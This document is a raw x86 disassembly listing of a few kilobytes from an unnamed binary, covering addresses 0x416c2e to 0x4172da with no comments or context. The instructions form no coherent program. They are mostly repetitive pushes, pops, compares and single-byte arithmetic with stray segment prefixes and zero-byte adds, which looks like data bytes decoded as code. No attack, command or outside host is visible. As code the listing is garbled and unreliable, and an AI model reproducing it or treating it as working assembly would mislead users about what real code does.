  416c2e:	cmp    ebp,DWORD PTR [esp+esi*1]
  416c31:	push   esp
  416c32:	ss sub al,0x50
  416c35:	cmp    esi,DWORD PTR [esi]
  416c37:	sub    al,0x20
  416c39:	ds push esp
  416c3b:	ss cmp edx,DWORD PTR ss:[edi+0x34]
  416c40:	push   esp
  416c41:	sub    al,0x3b
  416c43:	sub    al,0x50
  416c45:	pusha  
  416c46:	push   edi
  416c47:	cmp    esi,DWORD PTR [esi]
  416c49:	ss ss push eax
  416c4c:	push   ecx
  416c4d:	bound  edx,QWORD PTR [ecx+0x34]
  416c50:	pop    edi
  416c51:	ss push ecx
  416c53:	push   esp
  416c54:	sub    al,0x51
  416c56:	pop    edi
  416c57:	ds xor al,0x3e
  416c5a:	ds pop edi
  416c5c:	cmp    ebx,DWORD PTR [edi+0x36]
  416c5f:	sub    DWORD PTR [esi],esi
  416c61:	push   eax
  416c62:	ds push ecx
  416c64:	push   esp
  416c65:	push   edi
  416c66:	cmp    ebx,DWORD PTR ds:[edi+0x62]
  416c6a:	je     0x416cd0
  416c6c:	pop    edi
  416c6d:	push   ecx
  416c6e:	cmp    esi,DWORD PTR [esi]
  416c70:	push   eax
  416c71:	cmp    edx,DWORD PTR [esp+edx*2+0x3e]
  416c75:	xor    al,0x51
  416c77:	cmp    edx,DWORD PTR [eax+0x62]
  416c7a:	ds pusha 
  416c7c:	push   esp
  416c7d:	ss ss ss ss push ecx
  416c82:	sub    al,0x2c
  416c84:	xor    al,0x34
  416c86:	sub    al,0x2c
  416c88:	xor    al,0x20
  416c8a:	ds ss push eax
  416c8d:	ss ss ds cmp edi,DWORD PTR ds:[ebx]
  416c93:	push   esp
  416c94:	xor    al,0x34
  416c96:	ds push eax
  416c98:	ss ds push eax
  416c9b:	cmp    al,0x8b
  416c9d:	add    BYTE PTR [eax],al
  416c9f:	add    BYTE PTR [eax],al
  416ca1:	add    BYTE PTR [eax],al
  416ca3:	add    BYTE PTR [eax],dh
  416ca5:	sub    al,0x20
  416ca7:	sub    al,0x23
  416ca9:	xor    al,0x20
  416cab:	and    esp,DWORD PTR [ebx]
  416cad:	sub    al,0x17
  416caf:	pop    ss
  416cb0:	sub    DWORD PTR [eax],esp
  416cb2:	ss ds cmp edi,DWORD PTR ss:[esi]
  416cb7:	push   esp
  416cb8:	xor    al,0x51
  416cba:	sub    DWORD PTR ds:[ecx+0x23],edx
  416cbe:	ss ss ss ss ds xor al,0x23
  416cc5:	xor    al,0x3e
  416cc7:	pop    edi
  416cc8:	push   eax
  416cc9:	xor    al,0x34
  416ccb:	cmp    edx,DWORD PTR [edi+0x51]
  416cce:	pusha  
  416ccf:	pop    edi
  416cd0:	push   eax
  416cd1:	push   eax
  416cd2:	ds ss ss push esp
  416cd6:	cmp    esi,DWORD PTR ds:[ebx+eiz*1]
  416cda:	sub    al,0x51
  416cdc:	ss pop edi
  416cde:	pusha  
  416cdf:	cmp    ebp,DWORD PTR [esp+ebp*1]
  416ce2:	ss push esp
  416ce4:	push   esp
  416ce5:	ss ss push esp
  416ce8:	cmp    edx,DWORD PTR [edi+ebx*2+0x54]
  416cec:	jnp    0x416d5e
  416cee:	push   eax
  416cef:	cmp    esi,DWORD PTR [esi]
  416cf1:	push   edi
  416cf2:	push   eax
  416cf3:	ss push esp
  416cf5:	ds ds push eax
  416cf8:	ss fs xor al,0x3b
  416cfc:	push   esp
  416cfd:	sub    al,0x51
  416cff:	push   eax
  416d00:	cmp    edx,DWORD PTR [eax+0x3e]
  416d03:	sub    al,0x51
  416d05:	ds ss ss push eax
  416d09:	ss push ecx
  416d0b:	push   eax
  416d0c:	ss ss xor al,0x51
  416d10:	ds ds ss xor al,0x3b
  416d15:	cmp    esi,DWORD PTR [eax+edx*2]
  416d18:	push   ecx
  416d19:	ds sub al,0x2c
  416d1c:	sub    DWORD PTR [esi+0x0],ebp
  416d1f:	add    BYTE PTR [eax],al
  416d21:	add    BYTE PTR [eax],al
  416d23:	dec    ebp
  416d24:	and    BYTE PTR [esp+esi*1],ch
  416d27:	sub    DWORD PTR [ebx],esp
  416d29:	xor    al,0x34
  416d2b:	and    BYTE PTR ds:0x362c203b,dl
  416d31:	push   eax
  416d32:	sub    DWORD PTR [ebx+edi*1],esi
  416d35:	pop    ss
  416d36:	ss xor al,0x2c
  416d39:	push   esp
  416d3a:	cmp    esi,DWORD PTR [esi]
  416d3c:	push   edi
  416d3d:	ds ds cmp esi,DWORD PTR ds:[esi]
  416d42:	push   eax
  416d43:	cmp    ebp,DWORD PTR ds:[ecx]
  416d46:	and    BYTE PTR [esi],bh
  416d48:	push   edi
  416d49:	ss ss pop edi
  416d4c:	ss push ecx
  416d4e:	ds push ecx
  416d50:	pop    edi
  416d51:	xor    al,0x23
  416d53:	pop    edi
  416d54:	ds push ecx
  416d56:	push   esp
  416d57:	push   ecx
  416d58:	sub    al,0x51
  416d5a:	push   eax
  416d5b:	cmp    edx,DWORD PTR [eax+0x3b]
  416d5e:	push   ecx
  416d5f:	jo     0x416dc5
  416d61:	pusha  
  416d62:	push   eax
  416d63:	push   eax
  416d64:	sub    al,0x29
  416d66:	cmp    ebp,DWORD PTR [ecx]
  416d68:	sub    al,0x57
  416d6a:	push   esp
  416d6b:	ds pop edi
  416d6d:	outs   dx,DWORD PTR ds:[esi]
  416d6e:	jo     0x416dd4
  416d70:	push   eax
  416d71:	push   edi
  416d72:	cmp    edi,DWORD PTR [ebx]
  416d74:	push   ecx
  416d75:	push   ecx
  416d76:	push   eax
  416d77:	xor    al,0x3b
  416d79:	push   esp
  416d7a:	cmp    edx,DWORD PTR [edi+0x3e]
  416d7d:	ss xor al,0x29
  416d80:	xor    al,0x36
  416d82:	cmp    edi,DWORD PTR ss:[esi]
  416d85:	push   ecx
  416d86:	sub    al,0x34
  416d88:	xor    al,0x3b
  416d8a:	and    edx,DWORD PTR [ebx+edi*1+0x34]
  416d8e:	sub    al,0x3e
  416d90:	push   ecx
  416d91:	push   ecx
  416d92:	cmp    edi,DWORD PTR [ebx]
  416d94:	push   eax
  416d95:	ds push eax
  416d97:	push   eax
  416d98:	push   esp
  416d99:	push   ecx
  416d9a:	ss ss sub al,0x3b
  416d9e:	mov    WORD PTR [eax],es
  416da0:	add    BYTE PTR [eax],al
  416da2:	dec    edi
  416da3:	adc    eax,0x36292317
  416da8:	and    edx,DWORD PTR ds:0x23172020
  416dae:	and    BYTE PTR [ebx],ah
  416db0:	and    BYTE PTR [eax],ah
  416db2:	and    esp,DWORD PTR [eax]
  416db4:	sub    DWORD PTR [ecx+0x23],edx
  416db7:	push   eax
  416db8:	cmp    ebx,DWORD PTR ss:[edi+0x3b]
  416dbc:	push   edi
  416dbd:	ss cmp esi,DWORD PTR ss:[esi+edi*1]
  416dc2:	cmp    ebp,DWORD PTR [edi+ebx*2]
  416dc5:	push   esp
  416dc6:	cmp    edi,DWORD PTR [esi]
  416dc8:	ds push esp
  416dca:	push   ecx
  416dcb:	push   ecx
  416dcc:	push   esp
  416dcd:	xor    al,0x51
  416dcf:	cmp    edx,DWORD PTR [ecx+0x54]
  416dd2:	sub    DWORD PTR [esp+esi*1],ebp
  416dd5:	cmp    edx,DWORD PTR [eax+eiz*2+0x62]
  416dd9:	push   edi
  416dda:	pop    edi
  416ddb:	pusha  
  416ddc:	sub    al,0x34
  416dde:	xor    al,0x50
  416de0:	ss bound esp,QWORD PTR ds:[eax+0x60]
  416de5:	cmp    esp,DWORD PTR [eax+0x57]
  416de8:	sub    al,0x51
  416dea:	push   esp
  416deb:	pop    edi
  416dec:	push   edi
  416ded:	ds fs fs jo 0x416e52
  416df2:	sub    al,0x3e
  416df4:	ds ds sub al,0x29
  416df8:	cmp    edx,DWORD PTR ss:[eax+0x3e]
  416dfc:	cmp    edi,DWORD PTR [ebx]
  416dfe:	and    ebp,DWORD PTR [esi+edi*1]
  416e01:	xor    al,0x29
  416e03:	cmp    edx,DWORD PTR [ecx+0x3b]
  416e06:	ds xor al,0x51
  416e09:	ds ss ss cmp esi,DWORD PTR ds:[esp+edx*2]
  416e10:	ds push esp
  416e12:	ds xor al,0x36
  416e15:	ss ss sub al,0x2c
  416e19:	push   eax
  416e1a:	ds cmp ebp,DWORD PTR ds:[esi*1+0x28000000]
  416e23:	adc    eax,0x23202917
  416e28:	sub    DWORD PTR [esi],esi
  416e2a:	and    BYTE PTR ds:0x23293620,dl
  416e30:	sub    DWORD PTR [eax],esp
  416e32:	sub    al,0x23
  416e34:	sub    al,0x3e
  416e36:	xor    al,0x17
  416e38:	ss push ecx
  416e3a:	pop    edi
  416e3b:	push   ecx
  416e3c:	bound  edx,QWORD PTR [ecx+0x2c]
  416e3f:	sub    DWORD PTR [eax+0x2c],edx
  416e42:	push   esp
  416e43:	ds ds push ecx
  416e46:	push   ecx
  416e47:	push   esp
  416e48:	push   edi
  416e49:	push   ecx
  416e4a:	ss push edi
  416e4c:	push   edi
  416e4d:	ds ds cmp edx,DWORD PTR ds:[eax+0x50]
  416e53:	cmp    edx,DWORD PTR [edi+0x50]
  416e56:	sub    DWORD PTR [esi],esi
  416e58:	cmp    edx,DWORD PTR [eax+0x57]
  416e5b:	outs   dx,DWORD PTR ds:[esi]
  416e5c:	sub    al,0x3e
  416e5e:	sub    al,0x57
  416e60:	ds ds push eax
  416e63:	cmp    esi,DWORD PTR [eax+edx*2]
  416e66:	outs   dx,DWORD PTR ds:[esi]
  416e67:	push   esp
  416e68:	pop    edi
  416e69:	pop    edi
  416e6a:	outs   dx,DWORD PTR ds:[esi]
  416e6b:	pusha  
  416e6c:	jo     0x416eac
  416e6e:	pop    edi
  416e6f:	push   ecx
  416e70:	ds pop edi
  416e72:	bound  ebx,QWORD PTR [edi+0x5f]
  416e75:	push   eax
  416e76:	ss ss push ecx
  416e79:	pop    edi
  416e7a:	cmp    edx,DWORD PTR ds:[eax+0x51]
  416e7e:	push   eax
  416e7f:	push   edi
  416e80:	ss push eax
  416e82:	ds push eax
  416e84:	cmp    edi,DWORD PTR [esi]
  416e86:	ss push eax
  416e88:	cmp    edx,DWORD PTR ds:[ecx+0x50]
  416e8c:	push   ecx
  416e8d:	cmp    edi,DWORD PTR [ebx]
  416e8f:	ss cmp edi,DWORD PTR ss:[esi]
  416e93:	cmp    edi,DWORD PTR [ebx]
  416e95:	cmp    edi,DWORD PTR [ebx]
  416e97:	push   eax
  416e98:	sub    al,0x3b
  416e9a:	push   eax
  416e9b:	ds ds sub al,0x34
  416e9f:	dec    esi
  416ea0:	add    BYTE PTR [edi+0x10],cl
  416ea3:	pop    ss
  416ea4:	pop    ss
  416ea5:	pop    ss
  416ea6:	and    edx,DWORD PTR ss:0x2323502c
  416ead:	sub    DWORD PTR [eax],ecx
  416eaf:	xor    al,0x29
  416eb1:	xor    al,0x29
  416eb3:	sub    al,0x34
  416eb5:	and    ebp,DWORD PTR [ecx+edx*2]
  416eb8:	and    BYTE PTR [edi+edx*2+0x2c],dl
  416ebc:	sub    al,0x54
  416ebe:	ds push eax
  416ec0:	xor    al,0x50
  416ec2:	push   eax
  416ec3:	sub    DWORD PTR [esi],edi
  416ec5:	cmp    edx,DWORD PTR ds:[ecx+0x3e]
  416ec9:	pusha  
  416eca:	pusha  
  416ecb:	push   ecx
  416ecc:	pop    edi
  416ecd:	bound  edx,QWORD PTR [ecx+0x34]
  416ed0:	push   edi
  416ed1:	sub    DWORD PTR [ecx],ebp
  416ed3:	xor    al,0x5f
  416ed5:	bound  edi,QWORD PTR [ebx]
  416ed7:	cmp    edi,DWORD PTR [ebx]
  416ed9:	xor    al,0x3e
  416edb:	push   edi
  416edc:	pop    edi
  416edd:	push   eax
  416ede:	xor    al,0x51
  416ee0:	ds ds push esp
  416ee3:	ds ss push ecx
  416ee6:	pop    edi
  416ee7:	bound  ebp,QWORD PTR [esp+edx*2]
  416eea:	jg     0x416f5b
  416eec:	sub    al,0x5f
  416eee:	push   ecx
  416eef:	push   esp
  416ef0:	cmp    edx,DWORD PTR [eax+edx*2+0x60]
  416ef4:	bound  edi,QWORD PTR [esi]
  416ef6:	push   eax
  416ef7:	push   ecx
  416ef8:	pusha  
  416ef9:	cmp    edx,DWORD PTR [eax+eiz*2+0x3e]
  416efd:	push   ecx
  416efe:	pop    edi
  416eff:	pop    edi
  416f00:	ss pop edi
  416f02:	push   ecx
  416f03:	push   eax
  416f04:	cmp    edi,DWORD PTR [esi]
  416f06:	cmp    edx,DWORD PTR [ecx+0x50]
  416f09:	sub    al,0x3e
  416f0b:	xor    al,0x29
  416f0d:	ss sub al,0x36
  416f10:	ss xor al,0x2c
  416f13:	xor    al,0x3e
  416f15:	xor    al,0x3b
  416f17:	ss ss cmp esi,DWORD PTR ss:[esi]
  416f1c:	cmp    ebp,DWORD PTR [ecx+ebp*1]
  416f1f:	sub    DWORD PTR [eax],eax
  416f21:	outs   dx,BYTE PTR ds:[esi]
  416f22:	sub    DWORD PTR [esp+ebp*1],esi
  416f25:	sub    al,0x23
  416f27:	cmp    ebp,DWORD PTR [ebx+eiz*1]
  416f2a:	and    edi,DWORD PTR [ebx]
  416f2c:	xor    al,0x34
  416f2e:	xor    al,0x23
  416f30:	and    esi,DWORD PTR [ecx+ebp*1]
  416f33:	cmp    esp,DWORD PTR ss:[eax]
  416f36:	sub    al,0x29
  416f38:	and    BYTE PTR [esp+esi*1],dh
  416f3b:	push   eax
  416f3c:	xor    al,0x20
  416f3e:	cmp    edi,DWORD PTR [esi]
  416f40:	ss ds push esp
  416f43:	push   eax
  416f44:	cmp    edi,DWORD PTR [esi]
  416f46:	ss push ecx
  416f48:	xor    al,0x36
  416f4a:	and    edx,DWORD PTR [edi+0x60]
  416f4d:	push   edi
  416f4e:	push   ecx
  416f4f:	cmp    edi,DWORD PTR ds:[esi]
  416f52:	push   eax
  416f53:	ss ss ss push edi
  416f57:	push   eax
  416f58:	sub    DWORD PTR [edi+0x64],edx
  416f5b:	sub    DWORD PTR [ebx],edi
  416f5d:	pusha  
  416f5e:	push   edi
  416f5f:	pop    edi
  416f60:	push   esp
  416f61:	push   edi
  416f62:	ds push esp
  416f64:	push   esp
  416f65:	outs   dx,DWORD PTR ss:[esi]
  416f67:	ds push ecx
  416f69:	jo     0x416fa1
  416f6b:	xor    al,0x51
  416f6d:	push   edi
  416f6e:	push   ecx
  416f6f:	push   esp
  416f70:	push   ecx
  416f71:	push   ecx
  416f72:	cmp    esi,DWORD PTR [esi]
  416f74:	ds ds pusha 
  416f77:	fs push esp
  416f79:	xor    al,0x50
  416f7b:	push   ecx
  416f7c:	ds ds ss push ecx
  416f80:	cmp    edx,DWORD PTR ds:[esi+edi*1+0x3e]
  416f85:	push   ecx
  416f86:	ds push eax
  416f88:	push   esp
  416f89:	push   eax
  416f8a:	push   eax
  416f8b:	xor    al,0x2c
  416f8d:	ds ss push eax
  416f90:	cmp    esi,DWORD PTR ss:[esi]
  416f93:	xor    al,0x3b
  416f95:	cmp    esi,DWORD PTR [esi]
  416f97:	cmp    esp,DWORD PTR [ebx]
  416f99:	xor    al,0x36
  416f9b:	sub    al,0x3e
  416f9d:	cmp    ebp,DWORD PTR [ebx+eiz*1]
  416fa0:	dec    esi
  416fa1:	adc    BYTE PTR [eax],ah
  416fa3:	and    edx,DWORD PTR [edi]
  416fa5:	ss ss xor al,0x3b
  416fa9:	push   ecx
  416faa:	cmp    edi,DWORD PTR [ebx]
  416fac:	push   esp
  416fad:	sub    al,0x23
  416faf:	and    esp,DWORD PTR [eax]
  416fb1:	adc    eax,0x343b2936
  416fb6:	and    BYTE PTR [eax+0x29],dl
  416fb9:	sub    DWORD PTR [ecx+ebp*1],esi
  416fbc:	push   ecx
  416fbd:	and    BYTE PTR ss:[ebx+edi*1],ch
  416fc1:	xor    al,0x2c
  416fc3:	sub    DWORD PTR [esi],edi
  416fc5:	sub    DWORD PTR [ebx+edi*1],ebp
  416fc8:	push   eax
  416fc9:	cmp    esp,DWORD PTR [ebx]
  416fcb:	cmp    edx,DWORD PTR [edi]
  416fcd:	push   eax
  416fce:	push   eax
  416fcf:	push   ecx
  416fd0:	push   edi
  416fd1:	ss xor al,0x51
  416fd4:	push   edi
  416fd5:	ds pop edi
  416fd7:	push   edi
  416fd8:	push   ecx
  416fd9:	ds push edi
  416fdb:	push   eax
  416fdc:	push   ecx
  416fdd:	push   eax
  416fde:	cmp    esp,DWORD PTR [eax+esi*2+0x62]
  416fe2:	push   edi
  416fe3:	push   esp
  416fe4:	ds push ecx
  416fe6:	push   esp
  416fe7:	push   ecx
  416fe8:	pop    edi
  416fe9:	push   eax
  416fea:	bound  ebp,QWORD PTR [edi+0x64]
  416fed:	ds push edi
  416fef:	pop    edi
  416ff0:	ss ss sub al,0x51
  416ff4:	push   ecx
  416ff5:	push   ecx
  416ff6:	ss push esp
  416ff8:	push   edi
  416ff9:	cmp    edx,DWORD PTR [edi+0x51]
  416ffc:	cmp    esi,DWORD PTR [ebx+edi*1]
  416fff:	push   eax
  417000:	push   eax
  417001:	cmp    edi,DWORD PTR [ebx]
  417003:	xor    al,0x3b
  417005:	push   ecx
  417006:	xor    al,0x3b
  417008:	cmp    edx,DWORD PTR [ecx+edx*2+0x3b]
  41700c:	ss ds push eax
  41700f:	push   eax
  417010:	ss xor al,0x3b
  417013:	xor    al,0x34
  417015:	and    esi,DWORD PTR [esi+esi*1]
  417018:	sub    al,0x5f
  41701a:	and    BYTE PTR ss:[ebx],bh
  41701d:	xor    al,0x36
  41701f:	and    ebp,DWORD PTR [edi]
  417021:	and    BYTE PTR ds:0x2c172023,dl
  417027:	pop    ss
  417028:	movaps XMMWORD PTR [esp+esi*1],xmm5
  41702c:	xor    al,0x3e
  41702e:	cmp    esi,DWORD PTR ds:[ecx+ebp*1]
  417032:	sub    al,0x17
  417034:	and    esi,DWORD PTR [ecx+ebp*1]
  417037:	and    esi,DWORD PTR ss:[esi]
  41703a:	ss ds xor al,0x51
  41703e:	push   eax
  41703f:	xor    al,0x3b
  417041:	and    BYTE PTR [ebx+edi*1],dh
  417044:	xor    al,0x34
  417046:	xor    al,0x29
  417048:	push   eax
  417049:	push   eax
  41704a:	cmp    edi,DWORD PTR [esi]
  41704c:	cmp    esi,DWORD PTR ss:[eax+edx*2]
  417050:	push   edi
  417051:	push   ecx
  417052:	pusha  
  417053:	cmp    edx,DWORD PTR ds:[ecx+0x2c]
  417057:	pop    edi
  417058:	pop    edi
  417059:	pusha  
  41705a:	push   esp
  41705b:	cmp    esp,DWORD PTR [eax+0x54]
  41705e:	cmp    esp,DWORD PTR ds:[eax+0x3b]
  417062:	push   esp
  417063:	push   ecx
  417064:	jo     0x4170b7
  417066:	push   ecx
  417067:	outs   dx,DWORD PTR ds:[esi]
  417068:	push   ecx
  417069:	bound  esp,QWORD PTR [edi+edx*2+0x70]
  41706d:	push   eax
  41706e:	xor    al,0x50
  417070:	push   esp
  417071:	xor    al,0x36
  417073:	bound  esp,QWORD PTR [edx+0x51]
  417076:	push   ecx
  417077:	xor    al,0x36
  417079:	ds push ecx
  41707b:	xor    al,0x36
  41707d:	push   esp
  41707e:	cmp    edi,DWORD PTR [ebx]
  417080:	cmp    edi,DWORD PTR ds:[ebx]
  417083:	ds ss cmp edi,DWORD PTR ss:[ebx]
  417088:	xor    al,0x50
  41708a:	cmp    edi,DWORD PTR [ebx]
  41708c:	cmp    ebp,DWORD PTR [ecx]
  41708e:	push   ecx
  41708f:	sub    DWORD PTR ds:[ebx+edi*1],ebp
  417093:	xor    al,0x50
  417095:	xor    al,0x34
  417097:	ss push eax
  417099:	xor    al,0x3b
  41709b:	pop    ss
  41709c:	cmp    esi,DWORD PTR [esp+esi*1]
  41709f:	and    esp,DWORD PTR [edx]
  4170a1:	adc    eax,0x36291010
  4170a6:	and    BYTE PTR [edi],dl
  4170a8:	sub    DWORD PTR [edi],edx
  4170aa:	and    BYTE PTR [edi],dl
  4170ac:	pop    ss
  4170ad:	adc    eax,0x503e5129
  4170b2:	ds xor al,0x3e
  4170b5:	push   eax
  4170b6:	cmp    edx,DWORD PTR [esp+esi*1+0x29]
  4170ba:	and    ebp,DWORD PTR [ecx]
  4170bc:	and    BYTE PTR [esi],bh
  4170be:	ds xor al,0x50
  4170c1:	ss sub al,0x34
  4170c4:	ds sub DWORD PTR ds:[ebx],edi
  4170c8:	ds ds ss sub al,0x29
  4170cd:	cmp    edx,DWORD PTR ds:[edi+0x50]
  4170d1:	sub    al,0x62
  4170d3:	cmp    esi,DWORD PTR [esp+esi*1]
  4170d6:	sub    DWORD PTR [esi],edi
  4170d8:	push   eax
  4170d9:	ds ds pusha 
  4170dc:	fs pusha 
  4170de:	cmp    edi,DWORD PTR [esi]
  4170e0:	push   edi
  4170e1:	push   esp
  4170e2:	pop    edi
  4170e3:	push   esp
  4170e4:	ds push eax
  4170e6:	bound  edx,QWORD PTR ds:[eax+0x54]
  4170ea:	push   esp
  4170eb:	outs   dx,DWORD PTR ds:[esi]
  4170ed:	push   esp
  4170ee:	push   eax
  4170ef:	pop    edi
  4170f0:	push   esp
  4170f1:	cmp    edx,DWORD PTR [ecx+0x3b]
  4170f4:	cmp    edx,DWORD PTR [ecx+0x57]
  4170f7:	push   edi
  4170f8:	ds push ecx
  4170fa:	cmp    esi,DWORD PTR [esi]
  4170fc:	pusha  
  4170fd:	push   ecx
  4170fe:	push   eax
  4170ff:	push   edi
  417100:	ss ss xor al,0x3e
  417104:	push   ecx
  417105:	cmp    edx,DWORD PTR ds:[eax+0x29]
  417109:	sub    al,0x50
  41710b:	cmp    ebp,DWORD PTR [ecx]
  41710d:	sub    DWORD PTR ss:[esp+esi*1],esi
  417111:	cmp    edi,DWORD PTR [ebx]
  417113:	sub    DWORD PTR [esi],esi
  417115:	and    esi,DWORD PTR [esi]
  417117:	cmp    esi,DWORD PTR [esi]
  417119:	xor    al,0x2c
  41711b:	sub    DWORD PTR ds:0x15232936,edx
  417122:	adc    BYTE PTR [edi],dl
  417124:	and    esp,DWORD PTR [ebx]
  417126:	xor    al,0x23
  417128:	and    edx,DWORD PTR [edi]
  41712a:	and    ebp,DWORD PTR [ecx]
  41712c:	and    edx,DWORD PTR [eax]
  41712e:	pop    ss
  41712f:	adc    BYTE PTR [esi+esi*1],ch
  417132:	ss ss push eax
  417135:	cmp    ebp,DWORD PTR [eax+edx*2]
  417138:	push   edi
  417139:	cmp    edi,DWORD PTR [ebx]
  41713b:	ds xor al,0x3b
  41713e:	sub    al,0x23
  417140:	and    esp,DWORD PTR [ebx]
  417142:	push   eax
  417143:	ss sub al,0x3e
  417146:	push   eax
  417147:	sub    DWORD PTR [esi+esi*1],esi
  41714a:	and    edx,DWORD PTR [ebx+edi*1+0x20]
  41714e:	push   eax
  41714f:	cmp    ebx,DWORD PTR [edi+0x17]
  417152:	sub    DWORD PTR ds:[eax+0x54],edx
  417156:	and    edi,DWORD PTR ss:[esi]
  417159:	xor    al,0x36
  41715b:	pop    edi
  41715c:	xor    al,0x5f
  41715e:	pop    edi
  41715f:	push   eax
  417160:	push   eax
  417161:	xor    al,0x50
  417163:	pusha  
  417164:	push   edi
  417165:	push   esp
  417166:	push   edi
  417167:	push   edi
  417168:	pop    edi
  417169:	pop    edi
  41716a:	push   ecx
  41716b:	push   edi
  41716c:	pop    edi
  41716d:	push   esp
  41716e:	push   edi
  41716f:	push   edi
  417170:	push   eax
  417171:	xor    al,0x51
  417173:	push   ecx
  417174:	ss ss push eax
  417177:	sub    al,0x3e
  417179:	push   eax
  41717a:	ss push esp
  41717c:	push   edi
  41717d:	push   eax
  41717e:	push   eax
  41717f:	push   ecx
  417180:	pop    edi
  417181:	xor    al,0x34
  417183:	sub    al,0x36
  417185:	sub    al,0x3b
  417187:	cmp    edi,DWORD PTR [esi]
  417189:	ss cmp ebp,DWORD PTR ss:[eax+edx*2]
  41718e:	cmp    ebp,DWORD PTR [ecx]
  417190:	push   ecx
  417191:	xor    al,0x36
  417193:	and    edi,DWORD PTR [ebx]
  417195:	sub    DWORD PTR [esi+esi*1],esi
  417198:	push   eax
  417199:	sub    al,0x34
  41719b:	xor    al,0x50
  41719d:	xor    al,0x34
  41719f:	and    esp,DWORD PTR [ebx]
  4171a1:	adc    eax,0x17172917
  4171a6:	and    BYTE PTR [esi],dh
  4171a8:	sub    DWORD PTR [ebx+eiz*1],ebp
  4171ab:	pop    ss
  4171ac:	cmp    edx,DWORD PTR ss:[edi]
  4171af:	sub    DWORD PTR ss:[eax],esp
  4171b2:	sub    al,0x2c
  4171b4:	sub    DWORD PTR [ecx],ebp
  4171b6:	and    edx,DWORD PTR [edi]
  4171b8:	xor    al,0x29
  4171ba:	push   esp
  4171bb:	xor    al,0x3e
  4171bd:	push   esp
  4171be:	xor    al,0x50
  4171c0:	cmp    edx,DWORD PTR ss:[eax+0x36]
  4171c4:	sub    DWORD PTR [ecx],ebp
  4171c6:	push   ecx
  4171c7:	pop    edi
  4171c8:	xor    al,0x29
  4171ca:	cmp    esi,DWORD PTR [esi+esi*1]
  4171cd:	push   edi
  4171ce:	push   eax
  4171cf:	push   ecx
  4171d0:	push   eax
  4171d1:	ss push ecx
  4171d3:	xor    al,0x23
  4171d5:	push   esp
  4171d6:	push   esp
  4171d7:	push   esp
  4171d8:	cmp    edi,DWORD PTR [esi]
  4171da:	cmp    edi,DWORD PTR ss:[esi]
  4171dd:	push   ecx
  4171de:	bound  ebp,QWORD PTR [edi+0x57]
  4171e1:	bound  edx,QWORD PTR [eax+edx*2+0x5f]
  4171e5:	pop    edi
  4171e6:	jo     0x417248
  4171e8:	push   esp
  4171e9:	push   edi
  4171ea:	fs push eax
  4171ec:	pusha  
  4171ed:	push   ecx
  4171ee:	xor    al,0x5f
  4171f0:	push   ecx
  4171f1:	ss ss ds push eax
  4171f5:	push   ecx
  4171f6:	push   ecx
  4171f7:	ss push ecx
  4171f9:	ds ss ds push ecx
  4171fd:	cmp    edx,DWORD PTR [eax+0x51]
  417200:	push   ecx
  417201:	push   esp
  417202:	cmp    edx,DWORD PTR [ebx+edi*1+0x36]
  417206:	sub    al,0x36
  417208:	cmp    ebx,DWORD PTR [edi+0x51]
  41720b:	push   ecx
  41720c:	sub    al,0x36
  41720e:	ss xor al,0x34
  417211:	sub    DWORD PTR ds:[ecx],ebp
  417214:	cmp    esi,DWORD PTR [esi]
  417216:	sub    DWORD PTR [eax+eiz*1],ebp
  417219:	cmp    edi,DWORD PTR [ebx]
  41721b:	and    BYTE PTR [ecx],ch
  41721d:	ds cmp esp,DWORD PTR ds:[ebx]
  417221:	and    BYTE PTR ds:0x20201723,dl
  417227:	sub    DWORD PTR [eax],esp
  417229:	sub    DWORD PTR [ebx+eiz*1],esi
  41722c:	and    BYTE PTR [ecx],ch
  41722e:	adc    BYTE PTR [esi],dh
  417230:	or     BYTE PTR [eax],dl
  417232:	and    BYTE PTR [ebx],ah
  417234:	sub    DWORD PTR [ecx+0x20],edx
  417237:	and    BYTE PTR [ebx+edi*1],dh
  41723a:	cmp    ebp,DWORD PTR [esp+ebp*1]
  41723d:	ss sub al,0x29
  417240:	sub    DWORD PTR [ebx+edi*1+0x36],edx
  417244:	push   esp
  417245:	push   eax
  417246:	push   edi
  417247:	ds xor al,0x23
  41724a:	sub    al,0x51
  41724c:	ss xor al,0x54
  41724f:	push   eax
  417250:	push   esp
  417251:	cmp    edi,DWORD PTR [esi]
  417253:	cmp    esp,DWORD PTR [eax]
  417255:	cmp    edi,DWORD PTR ss:[ebx]
  417258:	pusha  
  417259:	pop    edi
  41725a:	push   eax
  41725b:	pop    edi
  41725c:	ss push eax
  41725e:	ds push ecx
  417260:	push   ecx
  417261:	fs pusha 
  417263:	bound  ebx,QWORD PTR ds:[edi+0x70]
  417267:	push   ecx
  417268:	push   ecx
  417269:	pusha  
  41726a:	push   edi
  41726b:	push   esp
  41726c:	bound  edx,QWORD PTR [edi+0x3b]
  41726f:	push   ecx
  417270:	push   esp
  417271:	push   ecx
  417272:	ds push esp
  417274:	push   edi
  417275:	pop    edi
  417276:	push   edi
  417277:	push   esp
  417278:	push   esp
  417279:	cmp    edx,DWORD PTR [eax+0x3e]
  41727c:	push   ecx
  41727d:	push   ecx
  41727e:	ds cmp esi,DWORD PTR ss:[esi+esi*1]
  417283:	push   esp
  417284:	ds ds ss ds xor al,0x36
  41728a:	ss xor al,0x29
  41728d:	sub    DWORD PTR [esp+ebp*1],ebp
  417290:	pop    ss
  417291:	sub    DWORD PTR [esp+esi*1],esi
  417294:	push   eax
  417295:	sub    al,0x2c
  417297:	xor    al,0x29
  417299:	cmp    ebp,DWORD PTR [ecx]
  41729b:	sub    DWORD PTR [ecx],ebp
  41729d:	ss sub al,0x34
  4172a0:	and    BYTE PTR [edi],dl
  4172a2:	pop    ss
  4172a3:	and    BYTE PTR [ebx],ah
  4172a5:	adc    eax,0x2329100f
  4172aa:	and    esp,DWORD PTR [ebx]
  4172ac:	sub    DWORD PTR [ebx+eiz*1],ebp
  4172af:	and    ebp,DWORD PTR [ecx]
  4172b1:	sub    al,0x23
  4172b3:	sub    al,0x20
  4172b5:	ss sub al,0x36
  4172b8:	and    ebp,DWORD PTR [eax+eiz*1]
  4172bb:	adc    eax,0x1720342c
  4172c0:	cmp    ebp,DWORD PTR [ecx+ebp*1]
  4172c3:	sub    al,0x34
  4172c5:	sub    DWORD PTR [esi],edi
  4172c7:	push   eax
  4172c8:	bound  esi,QWORD PTR [esi]
  4172ca:	cmp    edx,DWORD PTR [eax+0x3e]
  4172cd:	and    BYTE PTR [eax+edx*2],dh
  4172d0:	xor    al,0x3b
  4172d2:	push   ecx
  4172d3:	push   ecx
  4172d4:	ds push eax
  4172d6:	push   eax
  4172d7:	cmp    edx,DWORD PTR [edi+0x3b]
  4172da:	cmp    esp,DWORD PTR [eax+0x54]
